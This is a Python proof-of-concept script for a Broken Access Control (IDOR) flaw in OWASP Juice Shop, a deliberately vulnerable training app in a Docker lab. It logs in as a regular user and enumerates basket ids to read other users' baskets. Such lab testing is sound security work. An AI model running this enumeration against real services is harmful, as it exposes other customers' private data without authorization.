import requests
import sys
import json
from colorama import Fore, init

init(autoreset=True)

TARGET = "http://juice-shop:3000"
LOGIN_ENDPOINT = f"{TARGET}/rest/user/login"
REGISTER_ENDPOINT = f"{TARGET}/api/Users"
WHOAMI_ENDPOINT = f"{TARGET}/rest/user/whoami"
BASKET_ENDPOINT = f"{TARGET}/api/BasketItems/"

def print_header():
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}Broken Access Control (IDOR) PoC for OWASP Juice Shop")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"\n{Fore.YELLOW}Target endpoint: {BASKET_ENDPOINT}?id=<bid>")
    print(f"{Fore.YELLOW}Environment: Docker Virtual Environment (Attacker Container)")
    print(f"{Fore.YELLOW}Date: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def check_service_health():
    print(f"\n{Fore.CYAN}[*] Checking Juice Shop availability...")
    try:
        response = requests.get(f"{TARGET}/", timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✓ Juice Shop is up and running!")
            return True
    except Exception as e:
        print(f"{Fore.RED}✗ Connection error: {e}")
        print(f"{Fore.RED}Make sure Juice Shop is running: docker compose up -d juice-shop")
        return False

def register_user(email, password):
    print(f"{Fore.YELLOW}[0] Registering user {email} if it does not exist...")
    data = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1, "answer": "juice"}
    }
    try:
        r = requests.post(REGISTER_ENDPOINT, json=data, timeout=5)
        if r.status_code == 201:
            print(f"{Fore.GREEN}✓ Successfully registered user {email}")
            return True
        elif r.status_code == 400 and "email must be unique" in r.text:
            print(f"{Fore.YELLOW}User {email} already exists (registration skipped).")
            return True
        else:
            print(f"{Fore.RED}✗ Registration failed: HTTP {r.status_code}")
            print(f"{Fore.RED}Response: {r.text}")
    except Exception as e:
        print(f"{Fore.RED}Registration error: {e}")
    return False

def login_and_get_token(email, password):
    print(f"\n{Fore.YELLOW}[1] Logging in as a regular user")
    data = {"email": email, "password": password}
    try:
        r = requests.post(LOGIN_ENDPOINT, json=data, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}✗ Login failed, HTTP {r.status_code}")
            # Try to register and login again
            if register_user(email, password):
                print(f"{Fore.YELLOW}Retrying login after registration...")
                r = requests.post(LOGIN_ENDPOINT, json=data, timeout=5)
                if r.status_code != 200:
                    print(f"{Fore.RED}✗ Login failed after registration, HTTP {r.status_code}")
                    print(f"{Fore.RED}Response: {r.text}")
                    sys.exit(1)
            else:
                print(f"{Fore.RED}✗ Registration failed, cannot login!")
                sys.exit(1)
        resp_data = r.json()
        token = resp_data['authentication']['token']
        print(f"{Fore.GREEN}✓ Login successful, JWT token obtained")
        return token
    except Exception as e:
        print(f"{Fore.RED}Login error: {e}")
        sys.exit(1)

def get_my_basket_id(headers):
    print(f"\n{Fore.YELLOW}[2] Getting current user's basket id")
    try:
        r = requests.get(WHOAMI_ENDPOINT, headers=headers, timeout=5)
        resp = r.json()
        basket_id = resp.get('bid') or resp.get('basket', {}).get('id') or 1
        print(f"{Fore.GREEN}Your basket id: {basket_id}\n")
        return int(basket_id)
    except Exception as e:
        print(f"{Fore.RED}Error getting basket id: {e}")
        return 1

def test_idor_basket(headers, my_basket_id):
    print(f"\n{Fore.YELLOW}[3] Brute-forcing basket ids to access foreign baskets")
    print(f"{Fore.YELLOW}{'-'*80}")
    found_foreign = []
    for bid in range(1, my_basket_id + 10):
        if bid == my_basket_id:
            continue
        params = {"id": bid}
        r = requests.get(BASKET_ENDPOINT, params=params, headers=headers, timeout=5)
        print(f"{Fore.BLUE}[*] Basket id={bid} : HTTP {r.status_code}", end="")
        try:
            data = r.json()
        except Exception:
            print("")
            continue

        if r.status_code == 200 and data.get('data'):
            basket_items = data['data']
            foreign = any((item.get('BasketId') != my_basket_id) for item in basket_items)
            if foreign:
                print(f" {Fore.GREEN}--> Foreign basket! ({len(basket_items)} items)")
                found_foreign.append((bid, basket_items))
                for product in basket_items[:2]:
                    pname = product.get('ProductId')
                    qty = product.get('quantity')
                    print(f"    [id={bid}] ProductId: {pname}, quantity: {qty}")
            else:
                print("")
        else:
            print("")
    return found_foreign

def generate_report(found_foreign):
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}FINAL REPORT")
    print(f"{Fore.CYAN}{'='*80}\n")
    if found_foreign:
        print(f"{Fore.GREEN}[+] Broken Access Control (IDOR): confirmed!")
        print(f"{Fore.GREEN}[+] Number of foreign baskets found: {len(found_foreign)}\n")
        for (bid, items) in found_foreign:
            print(f" - Basket id={bid}: found {len(items)} items (sample):")
            sample = items[0] if items else {}
            print(f"     {json.dumps(sample, indent=2)[:120]}")
    else:
        print(f"{Fore.YELLOW}[-] Broken Access Control (IDOR) not confirmed")
    print(f"{Fore.CYAN}{'='*80}\n")

def main():
    print_header()
    if not check_service_health():
        sys.exit(1)
    email = "user@juice-sh.op"
    password = "user123"
    token = login_and_get_token(email, password)
    headers = {"Authorization": f"Bearer {token}"}
    my_basket_id = get_my_basket_id(headers)
    found_baskets = test_idor_basket(headers, my_basket_id)
    generate_report(found_baskets)

if __name__ == "__main__":
    main()